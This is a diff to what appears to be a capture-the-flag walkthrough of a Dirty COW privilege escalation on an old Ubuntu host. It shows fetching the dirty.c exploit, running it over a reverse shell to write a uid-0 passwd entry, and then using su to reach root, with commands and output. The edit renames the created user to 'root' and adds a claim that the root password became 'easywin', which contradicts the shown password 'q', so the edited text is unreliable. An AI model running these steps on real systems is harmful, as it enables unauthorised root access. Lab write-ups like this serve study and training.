@@ -384,7 +384,7 @@ It was fixed on the `Ubuntu 12.04 ESM (Precise Pangolin): released (3.2.0-115.15
 
 To find a good exploit for Dirty Cow, go to github.com/dirtycow/dirtycow.github.io/wiki/PoCs and find the exploit we need. We choosed `dirty.c` because it will create a new user with the root rights, it's less instable for our reverse shell. (https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 
-Download the file and modify the code to change the name of the created user to `easywin`
+Download the file and modify the code to change the name of the created user to `root`
 
 Need to past the code to the server, on `/tmp`. Without vim because we are on a reverse shell...
 
@@ -404,14 +404,14 @@ $ ./dirty
 Please enter the new password: q
 
 Complete line:
-easywin:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash
+root:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash
 
 mmap: b7fda000
 madvise 0
 
 ptrace 0
-Done! Check /etc/passwd to see if the new user was created.
-You can log in with the username 'easywin' and the password 'q'.
+Done! Check /etc/passwd to see if the new user was created and overwrite the original root.
+You can log in with the username 'root' and the password 'q'.
 
 
 DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
@@ -426,20 +426,20 @@ Read the `/etc/password` to check if the new user is good
 
 ```sh
 $ cat /etc/passwd
-easywin:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash
+root:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash
 ...
 ```
 
-There is the new user `easywin` with the uid 0 (root)
+We changed the root password to `easywin`
 
 ```sh
-$ su easywin
-su easywin
+$ su root
+su root
 Password: q
 
 $ id
 id
-uid=0(easywin) gid=0(root) groups=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 
 $ cd
 
